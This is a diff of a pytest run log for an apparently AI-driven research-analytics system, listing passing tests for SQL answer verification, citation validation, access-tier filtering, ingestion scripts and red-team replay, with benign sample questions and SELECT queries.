@@ -643,4 +643,402 @@ tests/orchestration/test_router.py::TestRouterEvaluationDataset::test_routing_da
 tests/orchestration/test_router.py::TestRouterComplexityClassification::test_trivial_query_returns_trivial_complexity [32mPASSED[0m[31m [ 36%][0m
 tests/orchestration/test_router.py::TestRouterComplexityClassification::test_complex_query_returns_complex_or_synthesis_heavy [32mPASSED[0m[31m [ 36%][0m
 tests/orchestration/test_router.py::TestRouterComplexityClassification::test_simple_query_returns_simple_or_trivial [32mPASSED[0m[31m [ 36%][0m
-tests/orchestration/test_router.py::TestRouterComplexityClassification::test_complexity_field_present_for_all_queries 
+tests/orchestration/test_router.py::TestRouterComplexityClassification::test_complexity_field_present_for_all_queries [32mPASSED[0m[31m [ 36%][0m
+tests/orchestration/test_schema_rag_wrapper.py::test_schema_rag_retrieve_returns_ddl_chunks [32mPASSED[0m[31m [ 36%][0m
+tests/orchestration/test_schema_rag_wrapper.py::test_schema_rag_join_graph_and_glossary_are_available [32mPASSED[0m[31m [ 36%][0m
+tests/orchestration/test_schema_rag_wrapper.py::test_schema_rag_token_reduction_uses_parsed_full_schema [32mPASSED[0m[31m [ 36%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q01-Which institute offers the most intensive innovation curriculum based on credits?-SELECT CAST(total_credit_score AS INTEGER) AS total_credits FROM academic_courses_details-rows0-text_cast_silent_failure] [32mPASSED[0m[31m [ 36%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q02-Show ratio of PhD innovation courses to Undergraduate ones for IIT Bombay.-SELECT COUNT(*) AS ratio FROM academic_courses_details WHERE institute = 'IIT Bombay'-rows1-None] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q03-Flag institutes where grant funding dropped more than 50 percent year-over-year.-SELECT institute, SUM(grant_received) AS total FROM innovation_grant_from_govt GROUP BY institute-rows2-aggregate_collapse] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q04-Top 5 funding agencies by amount.-SELECT gov_organisation_name FROM innovation_grant_from_govt GROUP BY gov_organisation_name-rows3-row_count_one_with_limit_missing] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q05-Percentage of IIT Madras innovations stuck at Lab Validation Level 4.-SELECT stage_of_technology, COUNT(*) FROM trl_stages GROUP BY stage_of_technology-rows4-aggregate_collapse] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q06-List Market Ready TRL 9 technologies for IIT Madras.-SELECT * FROM trl_stages WHERE stage_of_technology = 'TRL 9'-rows5-row_count_zero] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q07-Cost of Innovation grant spend for every Patent granted.-SELECT g.institute FROM innovation_grant_from_govt g JOIN combined_ipo_patent_data p ON g.institute = p.applicants-rows6-entity_resolution_join_risk] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q08-Show all PG innovation courses at IIT Madras for the last 3 years.-SELECT * FROM academic_courses_details WHERE level_of_course = 'PG' LIMIT 100-rows7-None] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q09-Which institute has the most PhD courses?-SELECT institute, COUNT(*) AS count FROM academic_courses_details WHERE level_of_course = 'PhD' GROUP BY institute ORDER BY count DESC-rows8-None] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q10-How does that compare to their UG numbers?-SELECT COUNT(*) AS count FROM actual_student_strength-rows9-None] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q11-YoY growth for PG courses at IIT Madras.-SELECT financial_year, COUNT(*) AS count FROM academic_courses_details GROUP BY financial_year-rows10-None] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q12-Strategy shift where UG stops and PhD spikes.-SELECT financial_year, level_of_course, COUNT(*) FROM academic_courses_details GROUP BY financial_year, level_of_course-rows11-aggregate_collapse] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q13-Correlation courses vs startups.-SELECT institute, course_count, startup_count FROM joined-rows12-null_ratio_high] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q14-High capex and low innovation courses.-SELECT institute, capex, courses FROM capex_courses-rows13-None] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q15-Rising stars whose funding grew while national average declined.-SELECT institute FROM trend_join-rows14-row_count_zero] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q16-High grants but low expenditure utilization audit.-SELECT institute, SUM(grant_received) AS grant FROM innovation_grant_from_govt GROUP BY institute-rows15-aggregate_collapse] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[Q17-Pipeline progression across TRL stages.-SELECT financial_year, stage_of_technology, 100 AS conversion_rate FROM vw_innovations_trl-rows16-metric_too_perfect] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-11-List researchers on a patent with applicant containing Biotech and a government innovation grant in the same financial year.-SELECT g.institute FROM innovation_grant_from_govt g JOIN combined_ipo_patent_data p ON g.institute = p.applicants-rows17-entity_resolution_join_risk] [32mPASSED[0m[31m [ 37%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-12-Progression from Idea Level 1 to Market Ready Level 9 across all IITs.-SELECT stage_of_technology, COUNT(*) FROM vw_innovations_trl GROUP BY stage_of_technology-rows18-aggregate_collapse] [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-13-Median time between patent filing and grant date plus correlation with grant amount.-SELECT field_of_invention, median_days FROM patent_dates-rows19-null_ratio_high] [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-14-Institutes with disparity between sanctioned intake and actual student strength.-SELECT institute, seats - total_students AS disparity FROM joined GROUP BY institute-rows20-aggregate_collapse] [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-15-Publications where author email domain differs from affiliated institute domain.-SELECT institute, email_record FROM combined_ipo_patent_data-rows21-None] [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-16-Total faculty salary expenditure per state vs research consultancy income.-SELECT state, salaries, consultancy FROM joined-rows22-null_ratio_high] [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-17-Startups with both FDI investment and seed funding sorted by investment.-SELECT f.startup_name FROM fdi_investment f JOIN seed_funding s ON f.startup_name = s.startup_name-rows23-row_count_zero] [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-18-Top 3 institutes by patents_granted/phd_students_graduated ratio per academic year.-SELECT patents_granted / phd_students_graduated AS ratio FROM yearly-rows24-division_by_zero_signal] [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-19-Average citation count of open-access vs non-open-access publications.-SELECT AVG(CAST(total_citations AS INTEGER)) FROM advance_search_data-rows25-text_cast_silent_failure] [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-20-Researchers listed as inventor on a patent plus publication in same subfield plus funding record from a ministry.-SELECT * FROM a JOIN b ON a.name = b.name JOIN c ON c.name = b.name JOIN d ON d.name = c.name-rows26-row_count_zero] [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_silent_wrong_answer.py::test_verifier_refuses_low_confidence_sql_answer [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_sql_oracle.py::TestResultVerifier::test_verify_empty_results_returns_warning [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_sql_oracle.py::TestResultVerifier::test_verify_large_result_set_returns_warning [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_sql_oracle.py::TestResultVerifier::test_verify_incomplete_sql_detected [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_sql_oracle.py::TestResultVerifier::test_verify_numeric_sanity_positive_h_index [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_sql_oracle.py::TestResultVerifier::test_verify_numeric_sanity_unrealistic_h_index [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_sql_oracle.py::TestResultVerifier::test_verify_numeric_sanity_unrealistic_impact_factor [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_sql_oracle.py::TestResultVerifier::test_verify_normal_results_passes [32mPASSED[0m[31m [ 38%][0m
+tests/orchestration/test_sql_oracle.py::TestConfidenceScoring::test_high_confidence_complete_sql_with_results [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_sql_oracle.py::TestConfidenceScoring::test_low_confidence_empty_results [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_sql_oracle.py::TestConfidenceScoring::test_medium_confidence_partial_issues [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_sql_oracle.py::TestConfidenceScoring::test_low_confidence_incomplete_sql [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_sql_oracle.py::TestSQLOracleAsk::test_ask_returns_oracle_response [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_sql_oracle.py::TestSQLOracleAsk::test_ask_low_confidence_triggers_correction [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_sql_oracle.py::TestExplanationGeneration::test_explanation_for_results [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_sql_oracle.py::TestExplanationGeneration::test_explanation_for_empty_results [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_sql_oracle.py::TestExplanationGeneration::test_explanation_for_low_confidence_includes_warning [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_sql_oracle.py::TestOracleResponse::test_oracle_response_fields [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_synthesizer_citations.py::test_extract_citations_from_response [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_synthesizer_citations.py::test_fallback_synthesis_returns_citations [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_synthesizer_llm.py::test_synthesizer_uses_llm_client [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_synthesizer_llm.py::test_synthesizer_falls_back_on_llm_failure [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_synthesizer_safety.py::test_system_prompt_uses_minimised_evidence_packet [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_synthesizer_safety.py::test_system_prompt_redacts_pii_secrets_and_raw_dump_fields [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_synthesizer_safety.py::test_cloud_synthesis_is_explicitly_gated [32mPASSED[0m[31m [ 39%][0m
+tests/orchestration/test_synthesizer_safety.py::test_synthesizer_node_does_not_preverify_with_cloud_when_gate_is_closed [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_synthesizer_safety.py::test_cloud_synthesis_reports_provenance_when_allowed [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_two_brain_conflict_resolution.py::TestTwoBrainConflictDetection::test_detects_factual_conflict_model_vs_db [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_two_brain_conflict_resolution.py::TestTwoBrainConflictDetection::test_no_conflict_when_both_paths_agree [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_two_brain_conflict_resolution.py::TestTwoBrainConflictDetection::test_model_wins_for_qualitative_analysis [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_two_brain_conflict_resolution.py::TestTwoBrainConflictResolution::test_live_db_wins_for_exact_counts [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_two_brain_conflict_resolution.py::TestTwoBrainConflictResolution::test_model_wins_for_trend_comparisons [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_two_brain_conflict_resolution.py::TestTwoBrainConflictResolution::test_confidence_delta_surface_when_unresolvable [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_two_brain_conflict_resolution.py::TestTwoBrainIntegration::test_full_pipeline_routes_and_resolves [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_verifier_node.py::TestCitationValidation::test_valid_pub_id_passes_validation [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_verifier_node.py::TestCitationValidation::test_hallucinated_pub_id_fails_validation [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_verifier_node.py::TestCitationValidation::test_mixed_valid_and_invalid_citations [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_verifier_node.py::TestCitationValidation::test_structured_citation_always_valid [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_verifier_node.py::TestCitationValidation::test_chunk_id_citation_always_valid [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_verifier_node.py::TestCitationValidation::test_malformed_citation_type_stripped [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_verifier_node.py::TestCitationValidation::test_duplicate_citations_deduplicated [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_verifier_node.py::TestCitationValidation::test_enriched_citations_contain_metadata [32mPASSED[0m[31m [ 40%][0m
+tests/orchestration/test_verifier_node.py::TestCitationValidation::test_invalid_citation_logged [32mPASSED[0m[31m [ 41%][0m
+tests/orchestration/test_verifier_node.py::TestCitationStripping::test_strip_function_removes_invalid_only [32mPASSED[0m[31m [ 41%][0m
+tests/orchestration/test_verifier_node.py::TestCitationStripping::test_stripped_response_preserves_text_around [32mPASSED[0m[31m [ 41%][0m
+tests/orchestration/test_verifier_node.py::TestCitationCoverage::test_coverage_calculation [32mPASSED[0m[31m [ 41%][0m
+tests/orchestration/test_verifier_node.py::TestCitationDeduplication::test_deduplicate_removes_duplicates [32mPASSED[0m[31m [ 41%][0m
+tests/orchestration/test_verifier_numeric_faithfulness.py::test_verifier_rejects_unsupported_numeric_claim_from_sql_rows [32mPASSED[0m[31m [ 41%][0m
+tests/orchestration/test_verifier_numeric_faithfulness.py::test_verifier_accepts_crore_scaled_numeric_claim_from_sql_rows [32mPASSED[0m[31m [ 41%][0m
+tests/orchestration/test_workflow_pipeline.py::test_workflow_runs_full_orchestration_pipeline [32mPASSED[0m[31m [ 41%][0m
+tests/orchestration/test_workflow_pipeline.py::test_workflow_surfaces_rag_failures_as_warnings [32mPASSED[0m[31m [ 41%][0m
+tests/property/test_citation_presence.py::TestCitationPresence::test_citation_with_source_has_evidence [32mPASSED[0m[31m [ 41%][0m
+tests/property/test_citation_presence.py::TestCitationPresence::test_citation_without_source_fails_verification [32mPASSED[0m[31m [ 41%][0m
+tests/property/test_citation_presence.py::TestCitationPresence::test_all_retrieval_sources_have_citations [32mPASSED[0m[31m [ 41%][0m
+tests/property/test_citation_presence.py::TestCitationPresence::test_empty_citations_with_sources_warns [32mPASSED[0m[31m [ 41%][0m
+tests/property/test_citation_presence.py::TestCitationPresence::test_citation_chain_is_complete [32mPASSED[0m[31m [ 41%][0m
+tests/property/test_citation_presence.py::TestCitationPresence::test_no_phantom_citations [32mPASSED[0m[31m [ 41%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_tier_filtering_hierarchy_researcher_superset [32mPASSED[0m[31m [ 41%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_tier_filtering_hierarchy_government_superset [32mPASSED[0m[31m [ 41%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_researcher_includes_all_tiers [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_researcher_tier[AI researchers in Gujarat] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_researcher_tier[Machine learning experts] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_researcher_tier[Data science researchers] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_researcher_tier[NLP researchers in India] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_researcher_tier[Computer vision research groups] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_researcher_tier[Robotics researchers] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_researcher_tier[Deep learning experts] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_researcher_tier[AI publications from IITs] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_researcher_tier[Research areas in AI] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_researcher_tier[Researchers working on LLMs] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_government_tier[AI researchers in Gujarat] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_government_tier[Policy recommendations for AI] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_government_tier[Research statistics by state] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_government_tier[Government research funding] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_industry_tier[AI researchers in Gujarat] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_industry_tier[Industry collaboration opportunities] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_random_queries_industry_tier[Anonymized researcher profiles] [32mPASSED[0m[31m [ 42%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_tier_filtering_consistency_across_multiple_queries [32mPASSED[0m[31m [ 43%][0m
+tests/property/test_tier_filtering_always_returns_subset.py::TestTierFilteringSubset::test_tier_filtering_no_data_leaks_upward [32mPASSED[0m[31m [ 43%][0m
+tests/property/test_token_budget_never_exceeded.py::TestTokenBudget::test_token_usage_within_budget [32mPASSED[0m[31m [ 43%][0m
+tests/property/test_token_budget_never_exceeded.py::TestTokenBudget::test_token_usage_exceeds_budget_returns_warning [32mPASSED[0m[31m [ 43%][0m
+tests/property/test_token_budget_never_exceeded.py::TestTokenBudget::test_token_tracking_multiple_queries [32mPASSED[0m[31m [ 43%][0m
+tests/property/test_token_budget_never_exceeded.py::TestTokenBudget::test_large_response_still_within_budget [32mPASSED[0m[31m [ 43%][0m
+tests/property/test_token_budget_never_exceeded.py::TestTokenBudget::test_token_budget_enforced_across_tiers [32mPASSED[0m[31m [ 43%][0m
+tests/property/test_token_budget_never_exceeded.py::TestTokenBudget::test_combined_query_conversation_token_budget [32mPASSED[0m[31m [ 43%][0m
+tests/regression/test_bug_fixes.py::TestRegressionAuth::test_invalid_credentials_returns_401 [32mPASSED[0m[31m [ 43%][0m
+tests/regression/test_bug_fixes.py::TestRegressionAuth::test_expired_token_returns_401 [32mPASSED[0m[31m [ 43%][0m
+tests/regression/test_bug_fixes.py::TestRegressionAuth::test_missing_auth_header_returns_403 [32mPASSED[0m[31m [ 43%][0m
+tests/regression/test_bug_fixes.py::TestRegressionQuery::test_empty_query_returns_400 [32mPASSED[0m[31m [ 43%][0m
+tests/regression/test_bug_fixes.py::TestRegressionQuery::test_very_long_query_handled [32mPASSED[0m[31m [ 43%][0m
+tests/regression/test_bug_fixes.py::TestRegressionQuery::test_query_with_special_characters [32mPASSED[0m[31m [ 43%][0m
+tests/regression/test_bug_fixes.py::TestRegressionRBAC::test_industry_cannot_see_phone [32mPASSED[0m[31m [ 43%][0m
+tests/regression/test_bug_fixes.py::TestRegressionRBAC::test_government_sees_aggregates_not_individual [32mPASSED[0m[31m [ 43%][0m
+tests/regression/test_bug_fixes.py::TestRegressionAPI::test_health_endpoint_works_when_db_down [32mPASSED[0m[31m [ 43%][0m
+tests/regression/test_bug_fixes.py::TestRegressionAPI::test_cache_invalidation_on_redis_failure [32mPASSED[0m[31m [ 44%][0m
+tests/regression/test_bug_fixes.py::TestRegressionSecurity::test_sql_injection_in_query_param [32mPASSED[0m[31m [ 44%][0m
+tests/regression/test_bug_fixes.py::TestRegressionSecurity::test_xss_in_query_sanitized [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_capture_killer_query_evidence.py::test_capture_harness_respects_explicit_database_url [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_capture_killer_query_evidence.py::test_capture_harness_defaults_to_populated_local_database [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_capture_killer_query_evidence.py::test_capture_harness_upgrades_default_root_database_url [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_capture_killer_query_evidence.py::test_explain_writer_registers_sqlite_split_part [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_check_env.py::test_cloud_synthesis_false_is_valid_opt_in_default [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_check_env.py::test_cloud_synthesis_true_is_valid_explicit_opt_in [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_check_env.py::test_cloud_synthesis_rejects_non_boolean_values [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_check_env.py::test_empty_staged_env_list_does_not_warn [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_check_slow_test_markers.py::test_long_timeout_requires_slow_marker [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_check_slow_test_markers.py::test_slow_marker_allows_long_timeout [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_check_slow_test_markers.py::test_module_slow_marker_allows_long_timeout [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_ingest_nrg_db.py::test_full_schema_contains_real_nrg_tables_and_columns [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_ingest_nrg_db.py::test_ingest_nrg_database_loads_csvs_documents_and_is_idempotent [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_ingest_qdrant.py::test_chunking_uses_512_with_50_overlap [32mPASSED[0m[31m [ 44%][0m
+tests/scripts/test_ingest_qdrant.py::test_dry_run_reports_ready_message [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_ingest_qdrant.py::test_non_dry_run_upserts_with_idempotent_point_ids [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_ingest_qdrant_documents.py::test_parse_document_txt_reads_frontmatter [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_ingest_qdrant_documents.py::test_access_tier_mapping [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_ingest_qdrant_documents.py::test_parse_legacy_metadata_block [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_ingest_qdrant_documents.py::test_parse_json_fenced_metadata_with_blank_arrays [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_ingest_qdrant_documents.py::test_dry_run_prepares_points_without_qdrant [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_ingest_qdrant_documents.py::test_ingest_upserts_idempotent_point_ids_and_metadata [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_ingest_qdrant_documents.py::test_prebuilt_payload_without_vectors_flows_through_embedding [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_insert_test_data_qdrant.py::test_qdrant_test_data_seeder_uses_supported_client_kwargs [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_missing_script_modules.py::test_migration_and_audit_investigation_scripts_import [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_missing_script_modules.py::test_seed_relations_script_invocation_can_import_src [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_phase7_preflight.py::test_phase7_preflight_blocks_without_helm [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_phase7_preflight.py::test_phase7_preflight_marks_triggers_ready [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_phase7_preflight.py::test_cli_require_returns_nonzero_when_task_blocked [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_prewarm_release_cache.py::test_default_release_queries_cover_three_acceptance_questions [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_prewarm_release_cache.py::test_query_payload_uses_production_query_contract [32mPASSED[0m[31m [ 45%][0m
+tests/scripts/test_prewarm_release_cache.py::test_prewarm_queries_posts_each_query_to_query_endpoint [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_pydantic_migration_guard.py::test_ci_guard_requires_required_jobs_to_pin_below_python_314 [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_pydantic_migration_guard.py::test_ci_guard_accepts_pinned_jobs_and_allowed_failure_314_lane [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_pydantic_migration_guard.py::test_direct_pydantic_v1_import_inventory_ignores_docs_and_reports_code [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_quality_bar_scorecard.py::test_c5_uses_scheduler_dry_run_when_live_qdrant_is_unavailable [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_red_team_live_replay.py::test_corpus_meets_lb5_minimums [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_red_team_live_replay.py::test_baseline_safe_http_without_leak_is_downgraded [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_red_team_live_replay.py::test_expected_safe_control_can_remain_allowed_safe [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_red_team_live_replay.py::test_dangerous_response_is_failure_decision [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_red_team_live_replay.py::test_summary_flags_uncontained_baseline_decisions [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_red_team_live_replay.py::test_local_api_startup_skips_embedder_warmup [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_red_team_replay_script.py::test_red_team_replay_uses_bounded_curl_timeouts [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_red_team_replay_script.py::test_red_team_replay_fails_fast_and_does_not_lock_demo_users [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_red_team_replay_script.py::test_red_team_replay_never_counts_http_000_as_pass_or_warning [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_red_team_replay_script.py::test_red_team_replay_xss_tests_fail_on_transport_errors [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_seed_relations.py::test_seed_relations_supports_current_sqlite_schema [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_sovereign_deploy_script.py::test_sovereign_deploy_script_help_runs [32mPASSED[0m[31m [ 46%][0m
+tests/scripts/test_sovereign_deploy_script.py::test_sovereign_deploy_script_imports [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_vector_drift_scheduler.py::TestShouldTriggerReindex::test_triggers_when_reindex_info_flag_set [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_vector_drift_scheduler.py::TestShouldTriggerReindex::test_triggers_when_max_shift_breaches_threshold [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_vector_drift_scheduler.py::TestShouldTriggerReindex::test_triggers_when_drift_alert_warning [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_vector_drift_scheduler.py::TestShouldTriggerReindex::test_triggers_when_drift_alert_critical [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_vector_drift_scheduler.py::TestShouldTriggerReindex::test_no_trigger_when_stable_and_no_flags [32mPASSED[0m[31m [ 47%][0m
+tests/scripts/test_vector_drift_scheduler.py::test_default_check_skips_benchmark_when_qdrant_has_no_indexed_vectors [32mPASSED[0m[31m [ 47%][0m
